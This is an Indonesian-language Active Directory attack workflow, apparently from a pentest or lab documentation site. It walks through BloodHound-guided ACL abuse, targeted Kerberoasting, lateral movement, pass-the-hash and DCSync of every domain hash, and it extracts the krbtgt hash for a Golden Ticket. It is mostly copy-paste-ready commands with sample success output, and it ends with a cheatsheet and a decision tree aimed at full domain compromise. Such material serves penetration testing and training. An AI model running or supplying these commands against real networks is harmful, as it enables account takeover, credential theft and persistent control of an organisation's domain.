## ═══════════════════════════════════════
## FASE 4: EKSPLOITASI ACL BERDASARKAN BLOODHOUND
## ═══════════════════════════════════════

> **Tujuan:** Eksploitasi setiap edge/relationship yang ditemukan BloodHound secara sistematis.

### Langkah 4.1 — Identifikasi Semua Edge Berbahaya

```cypher
/* Temukan semua dangerous ACL dari user yang kamu owned */
MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|
         ForceChangePassword|Owns|AllExtendedRights|AddMember|AddSelf]->(n)
RETURN u.name, type(r), n.name, labels(n)
ORDER BY type(r)
```

**Interpretasi hasil — tabel tindakan per edge:**

| Edge | Target Type | Tindakan | Tool |
|---|---|---|---|
| `GenericAll` | User | Reset password / Add SPN | `rpcclient setuserinfo2` |
| `GenericAll` | Group | Add anggota | `net rpc group addmem` |
| `GenericAll` | Computer | RBCD attack | `impacket-addcomputer` + Rubeus |
| `GenericWrite` | User | Tambah SPN → Kerberoast | `targetedKerberoast.py` |
| `GenericWrite` | Group | Add anggota | `bloodyAD add groupMember` |
| `ForceChangePassword` | User | Ganti password tanpa tau pass lama | `rpcclient setuserinfo2` |
| `WriteOwner` | Any | Ambil ownership lalu add permission | `owneredit.py` → `dacledit.py` |
| `WriteDacl` | Any | Tambah permission ke objek | `dacledit.py` |
| `AddMember` | Group | Langsung add diri ke group | `bloodyAD add groupMember` |
| `DCSync`/`GetChangesAll` | Domain | Dump semua hashes | `impacket-secretsdump` |

---

### Langkah 4.2 — Eksploitasi GenericAll → User (Force Change Password)

> Jika BloodHound menunjukkan: `alice --[GenericAll]--> svc_backup`

```bash
# Method 1: rpcclient (paling reliable, tidak perlu tau password lama target)
rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $DC_IP \
  -c "setuserinfo2 svc_backup 23 'NewPassword123!'"

# Method 2: bloodyAD
bloodyAD --host $DC_IP -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  set password svc_backup 'NewPassword123!'

# Method 3: net rpc
net rpc password svc_backup 'NewPassword123!' \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP

# Verifikasi creds baru berhasil
nxc smb $DC_IP -u "svc_backup" -p "NewPassword123!"
```

**OUTPUT BERHASIL ✅:**
```
SMB   10.10.10.10  445  DC01  [+] CORP.LOCAL\svc_backup:NewPassword123!
```

➡️ Simpan dan re-collect BloodHound dengan creds baru:
```bash
export NEW_USER="svc_backup"
export NEW_PASS="NewPassword123!"
echo "$NEW_USER:$NEW_PASS" >> ~/labs/ad/creds/found_creds.txt

# Re-run BloodHound collection dengan creds baru!
# User baru mungkin punya akses berbeda → graph bisa berubah
bloodhound-ce-python -d "$DOMAIN" -u "$NEW_USER" -p "$NEW_PASS" \
  -dc "dc01.$DOMAIN" -ns "$DC_IP" -c All --zip \
  -o ~/labs/ad/bloodhound/collections/
```

**OUTPUT GAGAL ❌ — Access denied:**
```
result was NT_STATUS_ACCESS_DENIED
```
➡️ Edge mungkin stale (data BloodHound sudah lama). Re-collect data terbaru:
```bash
bloodhound-ce-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" -ns "$DC_IP" -c ACL --zip \
  -o ~/labs/ad/bloodhound/collections/

# Atau coba grant rights dulu (jika punya WriteDacl)
# dacledit.py -action write -rights ResetPassword -target svc_backup ...
```

---

### Langkah 4.3 — Eksploitasi GenericWrite → Targeted Kerberoasting

> Jika BloodHound menunjukkan: `alice --[GenericWrite]--> bob`

```bash
# Step 1: Tambahkan SPN palsu ke akun bob (targetedKerberoast.py)
python3 /opt/targetedKerberoast/targetedKerberoast.py \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --dc-ip $DC_IP \
  --request-user "bob" \
  -o ~/labs/ad/creds/targeted_kerb.txt

# Atau dengan bloodyAD:
bloodyAD --host $DC_IP -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  set object bob servicePrincipalName -v "http/fakeSPN.corp.local"

# Step 2: Setelah SPN ditambah, Kerberoast user bob
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" \
  -dc-ip $DC_IP \
  -request-user "bob" \
  -outputfile ~/labs/ad/creds/targeted_kerb.txt

# Step 3: Crack
hashcat -m 13100 ~/labs/ad/creds/targeted_kerb.txt \
  /usr/share/wordlists/rockyou.txt --force
```

---

### Langkah 4.4 — Eksploitasi AddMember ke Group Sensitif

> Jika BloodHound menunjukkan: `alice --[AddMember]--> "Remote Management Users"`

```bash
# Tambahkan diri (alice) ke grup Remote Management Users
net rpc group addmem "Remote Management Users" "$USERNAME" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP

# Verifikasi berhasil masuk
net rpc group members "Remote Management Users" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" \
  -S $DC_IP | grep -i "$USERNAME"

# Sekarang coba WinRM!
nxc winrm $DC_IP -u "$USERNAME" -p "$PASSWORD"
```

**OUTPUT BERHASIL ✅ — WinRM terbuka:**
```
WINRM   10.10.10.10  5985  DC01  [+] CORP.LOCAL\alice:Password123! (Pwn3d!)
```

➡️ Dapat interactive shell:
```bash
evil-winrm -i $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Di dalam evil-winrm — cek privilege untuk privesc:
*Evil-WinRM* PS> whoami /priv
*Evil-WinRM* PS> net localgroup administrators
*Evil-WinRM* PS> whoami /groups
# → ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
```

**OUTPUT GAGAL ❌ — WinRM tetap ditolak setelah add member:**
```
WINRM   10.10.10.10  5985  DC01  [-] CORP.LOCAL\alice:Password123!
```
➡️ WinRM mungkin tidak aktif. Coba akses lain:
```bash
nxc rdp $DC_IP -u "$USERNAME" -p "$PASSWORD"    # → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --shares  # Cek share baru yang accessible
```

---

## ═══════════════════════════════════════
## FASE 5: ANALISIS SESSION & LATERAL MOVEMENT
## ═══════════════════════════════════════

### Langkah 5.1 — Temukan Computer dengan Privileged Session

```cypher
/* Computer yang punya Domain Admin session */
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i)domain admins.*"
RETURN c.name AS Computer, u.name AS LoggedInUser
ORDER BY c.name
```

**OUTPUT BERHASIL ✅ — Ada DA session:**
```
Computer              | LoggedInUser
WEB01.CORP.LOCAL      | ADMINISTRATOR@CORP.LOCAL
FS01.CORP.LOCAL       | JSMITH@CORP.LOCAL
```

➡️ Cek apakah kita bisa akses computer itu:
```cypher
/* Apakah kita punya path ke WEB01? */
MATCH p=(u:User {owned:true})-[*1..5]->(c:Computer {name:"WEB01.CORP.LOCAL"})
RETURN p
```

```bash
# Misalnya WEB01 IP = 10.10.10.50
# Test berbagai akses
nxc smb 10.10.10.50 -u "$USERNAME" -p "$PASSWORD"
nxc winrm 10.10.10.50 -u "$USERNAME" -p "$PASSWORD"
```

**OUTPUT BERHASIL ✅ — Bisa masuk ke WEB01 (Pwn3d):**
```
SMB   10.10.10.50  445  WEB01  [+] CORP.LOCAL\alice:Password123! (Pwn3d!)
```

➡️ Dump credentials di WEB01 untuk dapat hash DA:
```bash
# Dump SAM + LSA + LSASS dari WEB01
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@10.10.10.50"
```

**OUTPUT BERHASIL ✅ — Hash Administrator ditemukan:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
[*] NTDS.DIT secrets
```

➡️ Pass-the-Hash ke DC:
```bash
export ADMIN_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
nxc smb $DC_IP -u "Administrator" -H "$ADMIN_HASH"

# Jika (Pwn3d!) → DOMAIN COMPROMISED! Lanjut ke Fase 6 DCSync
```

---

## ═══════════════════════════════════════
## FASE 6: DCSYNC — DUMP SEMUA DOMAIN HASHES
## ═══════════════════════════════════════

> **Prasyarat:** Punya akun dengan hak `GetChanges` + `GetChangesAll` terhadap domain object, atau credentials Domain Admin.

### Langkah 6.1 — Cek DCSync Rights via BloodHound

```cypher
/* Cari siapa yang punya DCSync rights */
MATCH (n)-[r:DCSync|GetChanges|GetChangesAll|AllExtendedRights]->(d:Domain)
RETURN n.name, type(r), d.name
```

**OUTPUT BERHASIL ✅ — Ada user dengan DCSync:**
```
n.name                    | type(r)       | d.name
ADMINISTRATOR@CORP.LOCAL  | DCSync        | CORP.LOCAL
SVC_BACKUP@CORP.LOCAL     | GetChanges    | CORP.LOCAL
SVC_BACKUP@CORP.LOCAL     | GetChangesAll | CORP.LOCAL
```

➡️ Jika svc_backup kamu control → bisa DCSync tanpa harus jadi Domain Admin!

---

### Langkah 6.2 — Eksekusi DCSync

```bash
# Method 1: impacket-secretsdump (dari Parrot, paling umum)
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
  -just-dc \
  -outputfile ~/labs/ad/loot/dcsync_output.txt

# Method 2: Pass-The-Hash version
impacket-secretsdump "Administrator@$DC_IP" \
  -hashes "$ADMIN_HASH" \
  -just-dc \
  -outputfile ~/labs/ad/loot/dcsync_output.txt

# Cek hasilnya
cat ~/labs/ad/loot/dcsync_output.txt | head -30
```

**OUTPUT BERHASIL ✅ — ALL DOMAIN HASHES DUMPED:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5508500012cc005cf7082a9a89ebdfdf:::
alice:1103:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:3e4f2f9e7e3d2f1d9e2c3b4a5f6e7d8:::

[*] Cleaning up...
```

➡️ **DOMAIN FULLY COMPROMISED! Langkah selanjutnya:**
```bash
# Extract semua hashes penting
grep ":::" ~/labs/ad/loot/dcsync_output.txt > ~/labs/ad/loot/ntds_hashes.txt

# Extract krbtgt hash (untuk Golden Ticket)
export KRBTGT_HASH=$(grep "^krbtgt:" ~/labs/ad/loot/ntds_hashes.txt | cut -d: -f4)
echo "[*] KRBTGT Hash: $KRBTGT_HASH"

# Extract Domain SID (untuk Golden Ticket - butuh ini juga)
impacket-getPac "$DOMAIN/$USERNAME:$PASSWORD" -targetUser Administrator -dc-ip $DC_IP 2>/dev/null | grep "Domain SID"
# Atau:
rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $DC_IP -c "lsaquery"

echo "[*] Save krbtgt hash ke notes untuk Golden Ticket attack!"
echo "[*] → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>"

# Pass-The-Hash ke semua target dengan Administrator hash
export ADMIN_HASH=$(grep "^Administrator:" ~/labs/ad/loot/ntds_hashes.txt | cut -d: -f4)
nxc smb $DC_IP -u "Administrator" -H "aad3b435b51404eeaad3b435b51404ee:$ADMIN_HASH"
```

**OUTPUT GAGAL ❌ — DRSUAPI Access Denied:**
```
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```
➡️ User tidak punya DCSync rights. Gunakan BloodHound untuk cari path lain:
```cypher
/* Siapa yang punya DCSync dari owned principals via path? */
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(d:Domain)
)
RETURN p
LIMIT 10
```
➡️ Eksploitasi path yang ditemukan, lalu balik ke Fase 6.

---

## ═══════════════════════════════════════
## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA
## ═══════════════════════════════════════

| Error | Penyebab | Solusi |
|---|---|---|
| `KDC_ERR_PREAUTH_FAILED` | Credentials salah | Double-check username, coba NTLM auth |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username tidak exist | Cek user list dari File 35 |
| `KRB_AP_ERR_SKEW (37)` | Clock skew > 5 menit | `sudo ntpdate $DC_IP` |
| `LDAP connection failed` | LDAP port tertutup | Coba LDAPS port 636, atau pakai `-dc-ip` langsung |
| `Collection empty / 0 users` | Permission kurang | Butuh user dengan LDAP read access ke domain |
| `BloodHound container exit` | Port conflict/Docker issue | `docker compose down && docker compose up -d` |
| `No path found (query)` | Data stale atau tidak di-mark owned | Re-collect data, mark node sebagai owned dulu |
| `ACCESS_DENIED saat DCSync` | Tidak punya GetChanges rights | Exploit ACL chain dulu untuk dapatkan user dengan DCSync rights |
| `ImportError bloodhound-ce-python` | Package conflict Python | Gunakan `pipx` bukan `pip3` untuk install |
| `Cannot connect to Docker daemon` | Docker service mati | `sudo systemctl start docker` |
| `Invalid credentials setelah force change` | Password complexity policy | Password harus: uppercase+lowercase+number+special char |
| `Graph kosong di UI setelah import` | Import gagal | Cek size ZIP > 0, coba re-import, periksa BloodHound container logs |
| `Searching for google:` saat buntu | Edge tidak dikenal | Search: `bloodhound edge [NAMA_EDGE] exploitation 2024` |

---

## MASTER DECISION TREE (RINGKASAN)

```text
START: Punya valid credentials AD domain (dari File 35 atau File 05 SMB)
│
├─ FASE 0: Konfirmasi Environment
│   ├─ [DC reachable + creds valid]      → FASE 1 (Collection)
│   ├─ [(Pwn3d!) dari awal]              → Skip ke FASE 6 (DCSync langsung)
│   └─ [Creds invalid/locked]            → Balik ke File 35, spray hati-hati
│
├─ FASE 1: Collection Data BloodHound
│   ├─ [BloodHound CE running]           → bloodhound-ce-python collection
│   ├─ [Ada Windows shell]               → SharpHound → transfer ZIP → import
│   ├─ [Collection berhasil, ZIP ada]    → FASE 2 (Import)
│   └─ [Collection gagal]               → Cek DNS, Kerberos time, LDAP port
│
├─ FASE 2: Import & Verifikasi
│   ├─ [Data lengkap di UI]              → FASE 3 (Analisis)
│   └─ [Data kosong/corrupt]             → Re-collection, cek ZIP validity
│
├─ FASE 3: Analisis & Pathfinding
│   ├─ [Shortest path DA ditemukan]      → FASE 4 (Eksploitasi ACL chain)
│   ├─ [Kerberoastable users]            → Langkah 3.4 → Crack → new creds
│   ├─ [Password di description field]   → Test langsung → FASE 3 ulang
│   ├─ [DCSync rights ditemukan]         → FASE 6 (DCSync langsung)
│   └─ [Tidak ada path]                  → Re-collect + explore manual queries
│
├─ FASE 4: Eksploitasi ACL
│   ├─ [GenericAll → User]               → Reset password → new creds → re-collect
│   ├─ [AddMember → Group]               → Join group → WinRM/RDP → evil-winrm
│   ├─ [WriteDacl → Domain]              → Grant DCSync rights → FASE 6
│   ├─ [GenericWrite → User]             → Targeted Kerberoast → crack
│   └─ [WriteOwner → Object]             → Take ownership → WriteDacl → repeat
│
├─ FASE 5: Session Analysis
│   ├─ [DA session di computer lain]     → Lateral movement → secretsdump → PTH ke DC
│   └─ [Tidak ada DA session]            → Cari path lain via FASE 3 queries
│
└─ FASE 6: DCSync
    └─ [NTDS.DIT dumped]                 → DOMAIN COMPROMISED! 🏆
        ├─ krbtgt hash → Golden Ticket   → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
        ├─ Admin hash  → PTH ke semua host
        └─ User hashes → Crack offline   → <a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

```bash
# === SETUP ===
export DOMAIN="corp.local"
export DC_IP="10.10.10.10"
export USERNAME="alice"
export PASSWORD="Password123!"
export LHOST="10.10.14.5"
mkdir -p ~/labs/ad/{bloodhound/{collections,incoming},loot,creds}

# === VALIDASI CREDS ===
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD"
echo "$DC_IP dc01.$DOMAIN dc01" | sudo tee -a /etc/hosts

# === BLOODHOUND CE START ===
cd ~/tools/bloodhound-ce && docker compose up -d
docker compose ps                                          # Cek status
docker compose logs bloodhound | grep -i "password"       # Get initial pass

# === COLLECTION ===
bloodhound-ce-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" -ns "$DC_IP" -c All --zip \
  -o ~/labs/ad/bloodhound/collections/

# === KEY CYPHER QUERIES (jalankan di BloodHound CE UI → Cypher tab) ===
# Shortest path ke DA dari owned nodes:
# MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.name=~"(?i)domain admins.*" RETURN p LIMIT 10

# Kerberoastable users:
# MATCH (u:User) WHERE u.hasspn=true AND NOT u.name=~"(?i).*krbtgt.*" RETURN u.name,u.description,u.admincount

# Dangerous ACL dari owned user:
# MATCH (u:User{owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AddMember]->(n) RETURN u.name,type(r),n.name

# Siapa yang punya DCSync rights:
# MATCH (n)-[r:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN n.name,type(r),d.name

# Computer dengan DA session:
# MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name=~"(?i)domain admins.*" RETURN c.name,u.name

# === KERBEROAST ===
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP -request \
  -outputfile ~/labs/ad/creds/kerb_hashes.txt
hashcat -m 13100 ~/labs/ad/creds/kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force -O

# === ACL EXPLOIT ===
# ForceChangePassword / GenericAll → User:
rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $DC_IP \
  -c "setuserinfo2 TARGET_USER 23 'NewPass123!'"

# AddMember → Group:
net rpc group addmem "GROUP_NAME" "$USERNAME" \
  -U "$DOMAIN/$USERNAME%$PASSWORD" -S $DC_IP

# Verify dan test akses baru:
nxc winrm $DC_IP -u "$USERNAME" -p "$PASSWORD"
evil-winrm -i $DC_IP -u "$USERNAME" -p "$PASSWORD"

# === DCSYNC ===
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc \
  -outputfile ~/labs/ad/loot/dcsync.txt
grep "^krbtgt\|^Administrator" ~/labs/ad/loot/dcsync.txt

# === CROSS-SERVICE PIVOT (setelah dapat creds/hash baru) ===
nxc winrm $DC_IP -u "$USERNAME" -p "$PASSWORD"                          # → evil-winrm
nxc rdp $DC_IP -u "$USERNAME" -p "$PASSWORD"                            # → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
nxc smb $DC_IP -u "Administrator" -H "LM:NT_HASH"                      # → PTH
impacket-psexec "$DOMAIN/Administrator@$DC_IP" -hashes "LM:NT_HASH"   # → SYSTEM shell
```

---

### Cross-Service Pivot Chart (dari BloodHound findings)

Setiap kali dapat credentials baru dari BloodHound/DCSync, test ke sini:

```text
BloodHound Creds/Hash Found
         │
         ├─ ─→ Port 5985  (WinRM)     → evil-winrm       → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
         ├──→ Port 3389  (RDP)       → xfreerdp          → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
         ├──→ Port 445   (SMB)       → nxc/impacket      → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
         ├──→ Port 22    (SSH)       → ssh               → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
         ├──→ Port 1433  (MSSQL)     → nxc mssql         → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
         ├──→ Port 88    (Kerberos)  → Kerberoast/ASREP  → <a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>
         ├──→ krbtgt hash found      → Golden Ticket     → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
         ├──→ ACL edge found         → Abuse ACL chain   → <a href="/docs/ad-acl-abuse" class="text-[#00b4d8] hover:underline font-mono font-semibold">38_ad_acl_abuse_workflow.md</a>
         └──→ Domain Admin level     → Mark owned → re-run BH pathfinding → expand
```

---

> **➡️ NEXT:** Setelah BloodHound mapping selesai dan ada creds, lanjut ke **`[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting)`** untuk full Kerberos attack chain, atau ke **`[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)`** jika ada ACL edge yang ditemukan BloodHound.